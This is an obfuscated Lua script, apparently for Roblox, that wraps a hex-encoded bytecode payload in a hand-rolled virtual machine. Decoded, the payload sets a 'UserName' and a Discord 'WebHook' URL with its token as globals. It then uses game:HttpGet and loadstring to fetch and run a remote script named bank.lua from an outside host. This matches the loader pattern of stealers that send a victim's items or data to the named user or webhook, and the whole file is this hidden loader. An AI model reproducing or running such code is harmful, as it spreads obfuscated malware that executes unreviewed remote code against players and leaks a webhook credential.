do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 1;
		local v19;
		v16 = v4(v3(v16, 5), "..", function(v30)
			if (v1(v30, 2) == 79) then
				v19 = v0(v3(v30, 1, 1));
				return "";
			else
				local v68 = v2(v0(v30, 16));
				if v19 then
					local v75 = 0;
					local v76;
					while true do
						if (v75 == 1) then
							return v76;
						end
						if (v75 == 0) then
							v76 = v5(v68, v19);
							v19 = nil;
							v75 = 1;
						end
					end
				else
					return v68;
				end
			end
		end);
		local function v20(v31, v32, v33)
			if v33 then
				local v69 = (v31 / ((5 - 3) ^ (v32 - (2 - 1)))) % ((3 - 1) ^ (((v33 - (928 - ((1279 - (68 + 997)) + 713))) - (v32 - ((1272 - (226 + 1044)) - 1))) + 1));
				return v69 - (v69 % (1 + 0));
			else
				local v70 = (879 - (282 + 595)) ^ (v32 - (620 - (555 + 64)));
				return (((v31 % (v70 + v70)) >= v70) and (932 - (857 + 74))) or (0 - (0 - 0));
			end
		end
		local function v21()
			local v34 = v1(v16, v18, v18);
			v18 = v18 + 1;
			return v34;
		end
		local function v22()
			local v35, v36 = v1(v16, v18, v18 + (119 - (32 + 85)));
			v18 = v18 + 2 + 0;
			return (v36 * (57 + 199)) + v35;
		end
		local function v23()
			local v37, v38, v39, v40 = v1(v16, v18, v18 + 3);
			v18 = v18 + (961 - (892 + 65));
			return (v40 * (30800116 - (10282612 + 3740288))) + (v39 * (156337 - 90801)) + (v38 * (436 - (67 + 113))) + v37;
		end
		local function v24()
			local v41 = v23();
			local v42 = v23();
			local v43 = 1 + 0;
			local v44 = (v20(v42, 2 - 1, 15 + 5) * (((29 - 22) - 5) ^ (984 - (471 + 331 + 150)))) + v41;
			local v45 = v20(v42, 65 - 44, 83 - 52);
			local v46 = ((v20(v42, 57 - 25) == (1 + 0)) and -(998 - (915 + 82))) or (3 - 2);
			if (v45 == (0 - 0)) then
				if (v44 == (0 - (0 - 0))) then
					return v46 * (0 + 0);
				else
					v45 = 1 - 0;
					v43 = 438 - (145 + 293);
				end
			elseif (v45 == (3234 - ((1928 - (814 + 45)) + (290 - 172)))) then
				return ((v44 == (1486 - (998 + 27 + 461))) and (v46 * ((1 + 0 + 0) / 0))) or (v46 * NaN);
			end
			return v8(v46, v45 - (2320 - 1297)) * (v43 + (v44 / ((774 - (201 + 571)) ^ (113 - 61))));
		end
		local function v25(v47)
			local v48;
			if not v47 then
				local v71 = 885 - (261 + 624);
				while true do
					if (v71 == (0 - (0 - 0))) then
						v47 = v23();
						if (v47 == (1080 - (402 + 618 + 60))) then
							return "";
						end
						break;
					end
				end
			end
			v48 = v3(v16, v18, (v18 + v47) - (1424 - (630 + 793)));
			v18 = v18 + v47;
			local v49 = {};
			for v64 = 3 - 2, #v48 do
				v49[v64] = v2(v1(v3(v48, v64, v64)));
			end
			return v6(v49);
		end
		local v26 = v23;
		local function v27(...)
			return {...}, v12("#", ...);
		end
		local function v28()
			local v50 = 0 + 0;
			local v51;
			local v52;
			local v53;
			local v54;
			local v55;
			local v56;
			while true do
				local v66 = 0 - 0;
				local v67;
				while true do
					if (0 ~= v66) then
					else
						v67 = 0 + 0;
						while true do
							if (v67 == 1) then
								if (v50 == (1026 - (706 + 318))) then
									local v98 = 1251 - (721 + 530);
									while true do
										local v101 = 0;
										while true do
											if (v101 ~= 0) then
											else
												if (v98 ~= 0) then
												else
													local v117 = 0;
													while true do
														if ((1272 - (945 + 326)) == v117) then
															v98 = 1;
															break;
														end
														if (0 ~= v117) then
														else
															for v168 = 2 - 1, v23() do
																local v169 = 0 + 0;
																local v170;
																local v171;
																while true do
																	if (v169 ~= (700 - (271 + 429))) then
																	else
																		local v174 = 0;
																		while true do
																			if ((0 + 0) ~= v174) then
																			else
																				v170 = 0;
																				v171 = nil;
																				v174 = 1;
																			end
																			if (v174 ~= (1501 - (1408 + 92))) then
																			else
																				v169 = 1;
																				break;
																			end
																		end
																	end
																	if (v169 == (1087 - (461 + 625))) then
																		while true do
																			if ((1288 - (993 + 295)) == v170) then
																				v171 = v21();
																				if (v20(v171, 1 + 0, 1) == (1171 - (418 + 753))) then
																					local v178 = 0;
																					local v179;
																					local v180;
																					local v181;
																					local v182;
																					local v183;
																					local v184;
																					while true do
																						if ((0 + 0) == v178) then
																							v179 = 0 + 0;
																							v180 = nil;
																							v178 = 1 + 0;
																						end
																						if ((1 + 1) ~= v178) then
																						else
																							v183 = nil;
																							v184 = nil;
																							v178 = 3;
																						end
																						if (v178 == (530 - (406 + 123))) then
																							v181 = nil;
																							v182 = nil;
																							v178 = 2;
																						end
																						if (v178 == 3) then
																							while true do
																								if (v179 ~= 2) then
																								else
																									v184 = nil;
																									while true do
																										if (v180 == 2) then
																											while true do
																												if (v181 ~= (1770 - (1749 + 20))) then
																												else
																													local v192 = 0 + 0;
																													while true do
																														if (v192 == (1323 - (1249 + 73))) then
																															v181 = 2;
																															break;
																														end
																														if (v192 == (0 + 0)) then
																															v184 = {v22(),v22(),nil,nil};
																															if (v182 == (0 - 0)) then
																																local v203 = 0 - 0;
																																while true do
																																	if (v203 == 0) then
																																		v184[1903 - (106 + 1794)] = v22();
																																		v184[2 + 2] = v22();
																																		break;
																																	end
																																end
																															elseif (v182 == (1 + 0)) then
																																v184[8 - 5] = v23();
																															elseif (v182 == (5 - 3)) then
																																v184[117 - (4 + 110)] = v23() - ((586 - (57 + 527)) ^ (1443 - (41 + 1386)));
																															elseif (v182 ~= (106 - (17 + 86))) then
																															else
																																local v210 = 0;
																																local v211;
																																while true do
																																	if (v210 == (0 + 0)) then
																																		v211 = 0;
																																		while true do
																																			if (0 == v211) then
																																				v184[6 - 3] = v23() - (2 ^ 16);
																																				v184[4] = v22();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															v192 = 1;
																														end
																													end
																												end
																												if (v181 == 3) then
																													if (v20(v183, 8 - 5, 3) ~= (167 - (122 + 44))) then
																													else
																														v184[6 - 2] = v56[v184[4]];
																													end
																													v51[v168] = v184;
																													break;
																												end
																												if (v181 ~= (0 - 0)) then
																												else
																													local v194 = 0;
																													local v195;
																													while true do
																														if (v194 ~= (0 + 0)) then
																														else
																															v195 = 0 + 0;
																															while true do
																																if (v195 == (0 - 0)) then
																																	local v204 = 65 - (30 + 35);
																																	while true do
																																		if (1 ~= v204) then
																																		else
																																			v195 = 1 + 0;
																																			break;
																																		end
																																		if (v204 ~= 0) then
																																		else
																																			v182 = v20(v171, 2, 1260 - (1043 + 214));
																																			v183 = v20(v171, 15 - 11, 6);
																																			v204 = 1213 - (323 + 889);
																																		end
																																	end
																																end
																																if (v195 == 1) then
																																	v181 = 1;
																																	break;
																																end
																															end
																															break;
																														end
																													end
																												end
																												if (v181 == 2) then
																													local v196 = 0 - 0;
																													local v197;
																													local v198;
																													while true do
																														if (v196 == (581 - (361 + 219))) then
																															while true do
																																if (v197 == (320 - (53 + 267))) then
																																	v198 = 0;
																																	while true do
																																		if (v198 == (1 + 0)) then
																																			v181 = 416 - (15 + 398);
																																			break;
																																		end
																																		if (v198 == (982 - (18 + 964))) then
																																			local v209 = 0;
																																			while true do
																																				if (v209 ~= (3 - 2)) then
																																				else
																																					v198 = 1;
																																					break;
																																				end
																																				if ((0 + 0) ~= v209) then
																																				else
																																					if (v20(v183, 1, 1 + 0) == (851 - (20 + 830))) then
																																						v184[2] = v56[v184[2 + 0]];
																																					end
																																					if (v20(v183, 128 - (116 + 10), 2) ~= 1) then
																																					else
																																						v184[1 + 2] = v56[v184[3]];
																																					end
																																					v209 = 739 - (542 + 196);
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																														if (v196 == (0 - 0)) then
																															v197 = 0 + 0;
																															v198 = nil;
																															v196 = 1;
																														end
																													end
																												end
																											end
																											break;
																										end
																										if (v180 == 1) then
																											local v188 = 0;
																											local v189;
																											while true do
																												if (v188 == (0 + 0)) then
																													v189 = 0;
																													while true do
																														if (v189 == (1 + 0)) then
																															v180 = 4 - 2;
																															break;
																														end
																														if (v189 ~= (0 - 0)) then
																														else
																															local v201 = 1551 - (1126 + 425);
																															while true do
																																if (v201 == 1) then
																																	v189 = 1;
																																	break;
																																end
																																if (v201 == (405 - (118 + 287))) then
																																	v183 = nil;
																																	v184 = nil;
																																	v201 = 1;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																										if (v180 == (0 - 0)) then
																											local v190 = 1121 - (118 + 1003);
																											local v191;
																											while true do
																												if (v190 == (0 - 0)) then
																													v191 = 0;
																													while true do
																														if (v191 == (378 - (142 + 235))) then
																															v180 = 1;
																															break;
																														end
																														if (v191 == (0 - 0)) then
																															local v202 = 0;
																															while true do
																																if (v202 == (0 + 0)) then
																																	v181 = 977 - (553 + 424);
																																	v182 = nil;
																																	v202 = 1 - 0;
																																end
																																if (v202 ~= 1) then
																																else
																																	v191 = 1 + 0;
																																	break;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																									end
																									break;
																								end
																								if (v179 ~= (1 + 0)) then
																								else
																									local v186 = 0;
																									while true do
																										if (v186 == (1 + 0)) then
																											v179 = 2;
																											break;
																										end
																										if (v186 == (0 + 0)) then
																											v182 = nil;
																											v183 = nil;
																											v186 = 1;
																										end
																									end
																								end
																								if (v179 == 0) then
																									local v187 = 0;
																									while true do
																										if ((0 + 0) == v187) then
																											v180 = 0 - 0;
																											v181 = nil;
																											v187 = 1;
																										end
																										if (v187 == (2 - 1)) then
																											v179 = 1;
																											break;
																										end
																									end
																								end
																							end
																							break;
																						end
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															for v172 = 1, v23() do
																v52[v172 - (2 - 1)] = v28();
															end
															v117 = 1;
														end
													end
												end
												if (v98 == (1 + 0)) then
													return v54;
												end
												break;
											end
										end
									end
								end
								break;
							end
							if (v67 == (0 - 0)) then
								if (v50 == (753 - (239 + 514))) then
									local v99 = 0;
									while true do
										if (v99 == 2) then
											v50 = 1;
											break;
										end
										if (v99 == (0 + 0)) then
											v51 = {};
											v52 = {};
											v99 = 1330 - (797 + 532);
										end
										if (v99 ~= (1 + 0)) then
										else
											v53 = {};
											v54 = {v51,v52,nil,v53};
											v99 = 4 - 2;
										end
									end
								end
								if ((1203 - (373 + 829)) ~= v50) then
								else
									local v100 = 731 - (476 + 255);
									while true do
										if (v100 == (1131 - (369 + 761))) then
											local v102 = 0 + 0;
											while true do
												if (v102 ~= (1 - 0)) then
												else
													v100 = 2;
													break;
												end
												if (v102 == 0) then
													for v144 = 1, v55 do
														local v145 = 0;
														local v146;
														local v147;
														local v148;
														while true do
															if (v145 ~= 1) then
															else
																v148 = nil;
																while true do
																	if (v146 == (0 - 0)) then
																		local v175 = 0;
																		local v176;
																		while true do
																			if (v175 == 0) then
																				v176 = 238 - (64 + 174);
																				while true do
																					if (v176 ~= 1) then
																					else
																						v146 = 1 + 0;
																						break;
																					end
																					if (v176 == (0 - 0)) then
																						local v185 = 336 - (144 + 192);
																						while true do
																							if (v185 ~= 1) then
																							else
																								v176 = 1;
																								break;
																							end
																							if (v185 == 0) then
																								v147 = v21();
																								v148 = nil;
																								v185 = 1;
																							end
																						end
																					end
																				end
																				break;
																			end
																		end
																	end
																	if (v146 == (217 - (42 + 174))) then
																		if (v147 == (1 + 0)) then
																			v148 = v21() ~= (0 + 0);
																		elseif (v147 == 2) then
																			v148 = v24();
																		elseif (v147 == (2 + 1)) then
																			v148 = v25();
																		end
																		v56[v144] = v148;
																		break;
																	end
																end
																break;
															end
															if (v145 == 0) then
																v146 = 0;
																v147 = nil;
																v145 = 1505 - (363 + 1141);
															end
														end
													end
													v54[3] = v21();
													v102 = 1;
												end
											end
										end
										if (v100 == (1580 - (1183 + 397))) then
											local v103 = 0;
											while true do
												if (v103 ~= (2 - 1)) then
												else
													v100 = 1;
													break;
												end
												if ((0 + 0) ~= v103) then
												else
													v55 = v23();
													v56 = {};
													v103 = 1;
												end
											end
										end
										if (v100 == (2 + 0)) then
											v50 = 1977 - (1913 + 62);
											break;
										end
									end
								end
								v67 = 1 + 0;
							end
						end
						break;
					end
				end
			end
		end
		local function v29(v57, v58, v59)
			local v60 = 0;
			local v61;
			local v62;
			local v63;
			while true do
				if (v60 == 1) then
					v63 = v57[3];
					return function(...)
						local v77 = v61;
						local v78 = v62;
						local v79 = v63;
						local v80 = v27;
						local v81 = 1;
						local v82 = -1;
						local v83 = {};
						local v84 = {...};
						local v85 = v12("#", ...) - 1;
						local v86 = {};
						local v87 = {};
						for v91 = 0, v85 do
							if (v91 >= v79) then
								v83[v91 - v79] = v84[v91 + 1];
							else
								v87[v91] = v84[v91 + 1];
							end
						end
						local v88 = (v85 - v79) + 1;
						local v89;
						local v90;
						while true do
							v89 = v77[v81];
							v90 = v89[1];
							if (v90 <= 11) then
								if (v90 <= 5) then
									if (v90 <= 2) then
										if (v90 <= 0) then
											local v104 = 0;
											local v105;
											local v106;
											local v107;
											local v108;
											while true do
												if (v104 == 2) then
													for v157 = v105, v82 do
														v108 = v108 + 1;
														v87[v157] = v106[v108];
													end
													break;
												end
												if (v104 == 0) then
													v105 = v89[2];
													v106, v107 = v80(v87[v105](v13(v87, v105 + 1, v89[3])));
													v104 = 1;
												end
												if (v104 == 1) then
													v82 = (v107 + v105) - 1;
													v108 = 0;
													v104 = 2;
												end
											end
										elseif (v90 > 1) then
											v87[v89[2]]();
										else
											v59[v89[3]] = v87[v89[2]];
										end
									elseif (v90 <= 3) then
										do
											return;
										end
									elseif (v90 == 4) then
										v87[v89[2]] = v89[3] ~= 0;
									else
										v59[v89[3]] = v87[v89[2]];
									end
								elseif (v90 <= 8) then
									if (v90 <= 6) then
										v87[v89[2]] = v59[v89[3]];
									elseif (v90 == 7) then
										v87[v89[2]] = v89[3] ~= 0;
									else
										local v125 = 0;
										local v126;
										while true do
											if (v125 == 0) then
												v126 = v89[2];
												v87[v126] = v87[v126](v13(v87, v126 + 1, v82));
												break;
											end
										end
									end
								elseif (v90 <= 9) then
									local v111 = v89[2];
									v87[v111] = v87[v111](v13(v87, v111 + 1, v82));
								elseif (v90 == 10) then
									if (v87[v89[2]] == v89[4]) then
										v81 = v81 + 1;
									else
										v81 = v89[3];
									end
								else
									v87[v89[2]]();
								end
							elseif (v90 <= 17) then
								if (v90 <= 14) then
									if (v90 <= 12) then
										v87[v89[2]] = v89[3];
									elseif (v90 > 13) then
										v81 = v89[3];
									else
										for v150 = v89[2], v89[3] do
											v87[v150] = nil;
										end
									end
								elseif (v90 <= 15) then
									v87[v89[2]] = v59[v89[3]];
								elseif (v90 > 16) then
									v81 = v89[3];
								else
									v87[v89[2]] = v89[3];
								end
							elseif (v90 <= 20) then
								if (v90 <= 18) then
									if (v87[v89[2]] == v89[4]) then
										v81 = v81 + 1;
									else
										v81 = v89[3];
									end
								elseif (v90 == 19) then
									local v132 = v89[2];
									local v133, v134 = v80(v87[v132](v13(v87, v132 + 1, v89[3])));
									v82 = (v134 + v132) - 1;
									local v135 = 0;
									for v152 = v132, v82 do
										v135 = v135 + 1;
										v87[v152] = v133[v135];
									end
								else
									for v155 = v89[2], v89[3] do
										v87[v155] = nil;
									end
								end
							elseif (v90 <= 21) then
								do
									return;
								end
							elseif (v90 > 22) then
								local v136 = v89[2];
								local v137 = v87[v89[3]];
								v87[v136 + 1] = v137;
								v87[v136] = v137[v89[4]];
							else
								local v141 = 0;
								local v142;
								local v143;
								while true do
									if (v141 == 1) then
										v87[v142 + 1] = v143;
										v87[v142] = v143[v89[4]];
										break;
									end
									if (v141 == 0) then
										v142 = v89[2];
										v143 = v87[v89[3]];
										v141 = 1;
									end
								end
							end
							v81 = v81 + 1;
						end
					end;
				end
				if (v60 == 0) then
					v61 = v57[1];
					v62 = v57[2];
					v60 = 1;
				end
			end
		end
		return v29(v28(), {}, v17)(...);
	end
	v15("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574031B3O00682O7470733A2O2F672O6F662E70726F2F732F62616E6B2E6C756103083O00557365724E616D65030B3O0032346B456C6576656E5A7A03073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3132313035383339363139323339353337352F396C6654436747376D76575273364F77615F2D4B515A58736E39444D767569743947726D745A647A304C4F6862654C70566B6A327868464A4E57763976576A785069475200233O00120C3O00014O000D000100013O00260A3O0002000100010004113O0002000100120C000100013O00260A00010010000100020004113O0010000100120F000200033O00120F000300043O00201700030003000500120C000500064O0007000600014O0013000300064O000800023O00022O00020002000100010004113O0022000100260A00010005000100010004113O0005000100120C000200013O00260A00020017000100020004113O0017000100120C000100023O0004113O0005000100260A00020013000100010004113O0013000100120C000300083O001205000300073O00120C0003000A3O001205000300093O00120C000200023O0004113O001300010004113O000500010004113O002200010004113O000200012O00153O00017O00", v9(), ...);
